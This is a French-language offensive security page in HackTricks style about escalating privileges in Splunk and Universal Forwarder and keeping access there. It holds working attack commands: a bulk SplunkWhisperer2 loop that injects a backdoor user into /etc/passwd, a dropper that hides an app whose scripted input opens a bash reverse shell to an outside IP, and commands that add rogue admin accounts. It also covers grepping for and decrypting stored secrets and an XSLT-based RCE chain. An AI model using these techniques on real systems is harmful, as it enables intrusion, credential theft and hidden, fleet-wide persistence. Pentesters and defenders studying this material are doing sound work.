# Splunk LPE and Persistence

{{#include ../../banners/hacktricks-training.md}}

Si, en **énumérant** une machine **en interne** ou **en externe**, vous trouvez **Splunk en cours d’exécution** (généralement **8000** pour l’interface web et **8089** pour l’API de gestion), des identifiants valides peuvent souvent être transformés en **exécution de code** via l’installation d’apps, des scripted inputs, ou des actions de gestion. Si Splunk s’exécute en tant que **root**, cela devient souvent une **élévation de privilèges** immédiate.

Si vous n’avez besoin que de la surface d’attaque distante générique, de l’énumération, ou du chemin RCE via upload d’app, consultez :

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Si vous êtes **déjà root** et que le service Splunk n’écoute pas uniquement sur localhost, vous pouvez aussi voler des **hachages de mots de passe Splunk**, récupérer des **secrets chiffrés**, ou déposer une **app malveillante** pour conserver une persistance localement ou sur plusieurs forwarders.

## Interesting Local Files

Lorsque vous tombez sur un hôte exécutant Splunk ou Splunk Universal Forwarder, voici généralement les chemins les plus intéressants :
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Artifacts importants :

- **`$SPLUNK_HOME/etc/passwd`** : utilisateurs Splunk locaux et hashes de mots de passe.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`** : clé utilisée par Splunk pour chiffrer les secrets stockés dans plusieurs fichiers `.conf`.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`** : fichier initial de bootstrap admin ; utile dans les gold images et les erreurs de provisioning. Il est ignoré si `etc/passwd` existe déjà.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`** : endroit où les scripted inputs sont généralement activés.
- **`$SPLUNK_HOME/etc/deployment-apps/`** ou **`$SPLUNK_HOME/etc/apps/`** : bons emplacements pour cacher une app persistante ou revoir ce qui est déjà distribué.

## Résumé de l'exploit Splunk Universal Forwarder Agent

Pour plus de détails, voir [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Ceci est seulement un résumé :

**Vue d'ensemble de l'exploit :**
Un exploit ciblant le Splunk Universal Forwarder (UF) permet à des attaquants disposant du **agent password** d'exécuter du code arbitraire sur les systèmes exécutant l'agent, compromettant potentiellement une grande partie de l'environnement.

**Pourquoi cela fonctionne :**

- Le service de gestion UF est souvent exposé sur **TCP 8089**.
- Les attaquants peuvent s'authentifier à l'API et demander au forwarder d'installer un **malicious app bundle**.
- Le même primitive peut être utilisée localement pour **LPE** ou à distance pour **RCE**.
- Des outils publics comme **SplunkWhisperer2** créent automatiquement le app bundle et peuvent adapter les payloads aux cibles Linux.

**Façons courantes de récupérer le mot de passe :**

- Identifiants en clair dans la documentation, les scripts, les partages ou l'automatisation de déploiement.
- Hashes de mots de passe dans `$SPLUNK_HOME/etc/passwd` suivis d'un cracking hors ligne.
- Gold images ou résidus de provisioning tels que `user-seed.conf`.

**Impact :**

- Exécution de code au niveau SYSTEM/root sur chaque hôte compromis.
- Déploiement de apps persistantes, backdoors ou ransomware.
- Désactivation ou manipulation de la télémétrie avant que les données ne soient transférées.

**Exemple de commande pour l'exploitation :**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Exploits publics utilisables :**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistance via Scripted Inputs ou Malicious Apps

Si vous avez un **accès en écriture au filesystem** en tant que `root`/`splunk`, ou un accès authentifié pour installer des apps, un mécanisme de persistance très fiable consiste à déposer une **custom app** avec un **scripted input**. La propre documentation de Splunk s'attend à ce que les scripted inputs se trouvent sous un répertoire d'app et soient activés depuis `inputs.conf`.

Disposition typique :
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimal `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Dropper Linux rapide :
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notes:

- La même astuce fonctionne sur **Universal Forwarder** en utilisant `/opt/splunkforwarder/etc/apps/`.
- Les attaquants se fondent souvent dans le décor en modifiant un add-on légitime au lieu de créer une app manifestement malveillante.
- Sur un **deployment server**, déposer une app malveillante dans `deployment-apps/` devient une **persistance à l’échelle de toute la flotte** car les forwarders interrogent le serveur, téléchargent les apps mises à jour et redémarrent souvent pour les appliquer.

## Vol d’identifiants et prise de contrôle admin

Si vous pouvez lire les fichiers locaux de Splunk, il y a généralement deux bons objectifs : récupérer l’accès **Splunk admin** et récupérer les **identifiants de service chiffrés**.

### Hashs de mots de passe et utilisateurs locaux

Splunk stocke les données d’authentification locales dans `etc/passwd`. Selon le déploiement, le craquage de ce fichier peut permettre de récupérer des identifiants fonctionnels pour l’interface web et l’API de gestion.

Si vous avez déjà des identifiants **admin** valides et que Splunk utilise son backend d’authentification **native**, la CLI elle-même peut être utilisée pour la persistance :
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` et valeurs chiffrées

Splunk utilise `etc/auth/splunk.secret` pour protéger des valeurs sensibles stockées dans plusieurs fichiers de configuration. Si vous pouvez voler à la fois le **secret** et les fichiers **`.conf`** pertinents, vous pouvez souvent récupérer ou rejouer :

- des secrets partagés forwarder/indexer comme `pass4SymmKey`
- des mots de passe de clé privée TLS comme `sslPassword`
- des identifiants de liaison LDAP comme `bindDNPassword`

C’est utile pour la **lateral movement** même lorsque le mot de passe admin de Splunk lui-même n’est pas cassable.

### Abus de `user-seed.conf`

`user-seed.conf` n’est consommé qu’au premier démarrage ou lorsque `etc/passwd` n’existe pas. Cela le rend moins utile sur une machine en production, mais très intéressant dans :

- des modèles d’installation compromis
- des images de conteneur
- des workflows de provisioning non supervisés
- des appliances où Splunk est réinitialisé automatiquement

Dans ces cas-là, déposer un `HASHED_PASSWORD` généré avec `splunk hash-passwd` vous donne un moyen discret de retrouver l’accès admin après un redéploiement.

## Abusing Splunk Queries

Pour plus de détails, consultez [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).

Une technique récente utile consiste à abuser de **user-supplied XSLT** dans des versions vulnérables de Splunk Enterprise pour transformer un compte authentifié à faibles privilèges en **OS command execution** en tant qu’utilisateur `splunk`.

Flux de haut niveau :

1. S’authentifier à Splunk.
2. Uploader un fichier **XSL** malveillant via la fonctionnalité de preview/upload.
3. Faire rendre à Splunk les résultats de recherche avec cette feuille de style uploadée depuis le répertoire **dispatch**.
4. Utiliser le payload XSLT pour écrire un fichier ou déclencher l’exécution via le pipeline de recherche de Splunk (par exemple en atteignant une fonctionnalité interne telle que `runshellscript`).

Le point offensif important est que ce chemin permet une **post-auth RCE sans besoin d’app upload**. Sur Linux, il vous amène généralement dans le compte **`splunk`**, ce qui reste très utile car cet utilisateur possède souvent l’arborescence de l’application, peut lire des secrets et peut déposer des apps persistantes qui survivent à la perte du shell.

Un chemin représentatif utilisé pendant l’exploitation est :
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Si Splunk s'exécute avec trop de privilèges, ou si l'utilisateur `splunk` a accès à des scripts dangereux, à des service units inscriptibles, ou à de mauvaises règles `sudo`, cela devient une chaîne **LPE** propre.

## References

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
